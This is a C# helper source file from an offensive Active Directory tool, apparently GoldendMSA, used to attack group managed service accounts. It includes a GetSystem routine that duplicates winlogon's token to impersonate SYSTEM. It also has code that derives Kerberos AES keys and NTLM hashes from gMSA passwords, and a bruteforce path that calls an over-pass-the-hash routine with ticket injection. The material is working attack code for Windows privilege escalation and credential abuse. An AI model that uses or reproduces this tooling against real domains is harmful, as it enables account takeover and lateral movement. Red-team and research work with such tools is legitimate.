using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using Cryptography;
using GoldendMSA.lib;

namespace GoldendMSA
{
    public class Helpers
    {
        private static string[] _stringArrayAttributeName =
        {
            "serviceprincipalname",
            "memberof"
        };

        private static string[] _datetimeAttributes =
        {
            "lastlogon",
            "lastlogoff",
            "pwdlastset",
            "badpasswordtime",
            "lastlogontimestamp"
        };

        private static string[] _dateStringAttributes =
        {
            "whenchanged",
            "whencreated"
        };

        private static string[] _intAttributes =
        {
            "useraccountcontrol",
            "msds-supportedencryptiontypes"
        };

        public static byte[] SendBytes(string server, int port, byte[] data)
        {
            var ipEndPoint = new IPEndPoint(IPAddress.Parse(server), port);
            try
            {
                using var client = new TcpClient(ipEndPoint.AddressFamily);
                // connect to the server over The specified port
                client.Client.Ttl = 128;
                client.Connect(ipEndPoint);
                var socketReader = new BinaryReader(client.GetStream());
                var socketWriter = new BinaryWriter(client.GetStream());

                socketWriter.Write(IPAddress.HostToNetworkOrder(data.Length));
                socketWriter.Write(data);

                var recordMark = IPAddress.NetworkToHostOrder(socketReader.ReadInt32());
                var recordSize = recordMark & 0x7fffffff;

                if ((recordMark & 0x80000000) > 0)
                {
                    Console.WriteLine(
                        "[X] Unexpected reserved bit set on response record mark from Domain Controller {0}:{1}, aborting",
                        server, port);
                    return null;
                }

                var responseRecord = socketReader.ReadBytes(recordSize);

                if (responseRecord.Length != recordSize)
                {
                    Console.WriteLine("[X] Incomplete record received from Domain Controller {0}:{1}, aborting", server,
                        port);
                    return null;
                }

                return responseRecord;
            }
            catch (SocketException e)
            {
                if (e.SocketErrorCode == SocketError.TimedOut)
                    Console.WriteLine("[X] Error connecting to {0}:{1} : {2}", server, port, e.Message);
                else
                    Console.WriteLine("[X] Failed to get response from Domain Controller {0}:{1} : {2}", server, port,
                        e.Message);
            }
            catch (FormatException fe)
            {
                Console.WriteLine("[X] Error parsing IP address {0} : {1}", server, fe.Message);
            }

            return null;
        }

        public static byte[] StringToByteArray(string hex)
        {
            // converts a rc4/AES/etc. string into a byte array representation

            if (hex.Length % 16 != 0)
            {
                Console.WriteLine("[X] Hash must be 16, 32 or 64 characters in length");
                Environment.Exit(1);
            }

            // yes I know this inefficient
            return Enumerable.Range(0, hex.Length)
                .Where(x => x % 2 == 0)
                .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                .ToArray();
        }

        public static Interop.PRINCIPAL_TYPE StringToPrincipalType(string name)
        {
            switch (name)
            {
                case "principal":
                    return Interop.PRINCIPAL_TYPE.NT_PRINCIPAL;
                case "x500":
                    return Interop.PRINCIPAL_TYPE.NT_X500_PRINCIPAL;
                case "enterprise":
                    return Interop.PRINCIPAL_TYPE.NT_ENTERPRISE;
                case "srv_xhost":
                    return Interop.PRINCIPAL_TYPE.NT_SRV_XHST;
                case "srv_host":
                    return Interop.PRINCIPAL_TYPE.NT_SRV_HST;
                case "srv_inst":
                    return Interop.PRINCIPAL_TYPE.NT_SRV_INST;
                default:
                    throw new ArgumentException($"name argument with value {name} is not supported");
            }
        }

        public static bool IsBase64String(string input)
        {
            if (string.IsNullOrEmpty(input))
                return false;

            try
            {
                var base64Bytes = Convert.FromBase64String(input.Trim());
                return base64Bytes.Length > 0;
            }
            catch (FormatException)
            {
                return false;
            }
        }

        public static string ConvertBase64ToNtlm(string base64String)
        {
            // Decode base64 to byte array
            var decodedData = Convert.FromBase64String(base64String);

            // Create MD4 hash
            using (var md4 = new Md4())
            {
                var hashBytes = md4.ComputeHash(decodedData);

                // Convert to hex string (lowercase)
                return BitConverter.ToString(hashBytes).Replace("-", "").ToLowerInvariant();
            }
        }

        public static int Base64ToAes(string username, string domainName, string password, bool bruteforceMode = true,
            bool ptt = false, bool verbose = false)
        {
            var decodedPassword = Convert.FromBase64String(password);
            var utf16Password = Encoding.Unicode.GetString(decodedPassword);
            var utf8Password = Encoding.UTF8.GetBytes(utf16Password);
            var pureUsername = username.Split('$')[0];
            var salt = domainName.ToUpper() + "host" + pureUsername.ToLower() + "." + domainName.ToLower();
            var aes = new Aes256();
            var aes256Key = aes.StringToKeyAes256(utf8Password, salt);
            var aes128Key = aes.StringToKeyAes128(utf8Password, salt);
            var aes256Hash = BitConverter.ToString(aes256Key).Replace("-", "").ToLower();
            var aes128Hash = BitConverter.ToString(aes128Key).Replace("-", "").ToLower();

            if (bruteforceMode)
            {
                if (OverPassTheHash.Over_pass_the_hash(username, domainName, aes256Hash, ptt, verbose) == 1)
                {
                    Console.WriteLine($"AES-256 Hash:\t{aes256Hash}");
                    Console.WriteLine($"AES-128 Hash:\t{aes128Hash}");
                    return 1;
                }
            }
            else
            {
                Console.WriteLine($"AES-256 Hash:\t{aes256Hash}");
                Console.WriteLine($"AES-128 Hash:\t{aes128Hash}");
            }

            return 0;
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static bool GetSystem()
        {
            // helper to elevate to SYSTEM for Kerberos ticket enumeration via token impersonation
            if (IsHighIntegrity())
            {
                IntPtr hToken;

                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with DuplicateToken
                var processes = Process.GetProcessesByName("winlogon");
                var handle = processes[0].Handle;

                // TOKEN_DUPLICATE = 0x0002
                var success = Interop.OpenProcessToken(handle, 0x0002, out hToken);
                if (!success)
                {
                    Console.WriteLine("[!] GetSystem() - OpenProcessToken failed!");
                    return false;
                }

                // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
                // 2 == SecurityImpersonation
                var hDupToken = IntPtr.Zero;
                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
                if (!success)
                {
                    Console.WriteLine("[!] GetSystem() - DuplicateToken failed!");
                    return false;
                }

                success = Interop.ImpersonateLoggedOnUser(hDupToken);
                if (!success)
                {
                    Console.WriteLine("[!] GetSystem() - ImpersonateLoggedOnUser failed!");
                    return false;
                }

                // clean up the handles we created
                Interop.CloseHandle(hToken);
                Interop.CloseHandle(hDupToken);

                if (!IsSystem()) return false;

                return true;
            }

            return false;
        }

        /*
         * Description - Checks if the GUID is valid.
         */
        public static bool IsValidGuid(string input)
        {
            if (string.IsNullOrWhiteSpace(input))
                return false;

            return Guid.TryParse(input, out _);
        }

        /*
         * Description - checks if domain name is valid.
         */
        public static bool IsValidDomainFormatRegex(string domain)
        {
            if (string.IsNullOrWhiteSpace(domain))
                return false;

            // Remove trailing dot if present
            domain = domain.TrimEnd('.');

            // Check length
            if (domain.Length > 253)
                return false;

            // Regex pattern for domain validation
            var pattern =
                @"^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?$";

            return Regex.IsMatch(domain, pattern, RegexOptions.IgnoreCase);
        }

        /*
         * Description - Looks if we are using SYSTEM user.
         */
        public static bool IsCurrentUserSystem()
        {
            try
            {
                using (var identity = WindowsIdentity.GetCurrent())
                {
                    return identity.User?.Value == "S-1-5-18";
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error checking system user: {ex.Message}");
                return false;
            }
        }

        public static bool IsSystem()
        {
            // returns true if the current user is "NT AUTHORITY\SYSTEM"
            var currentSid = WindowsIdentity.GetCurrent().User;
            return currentSid != null && currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid);
        }
    }
}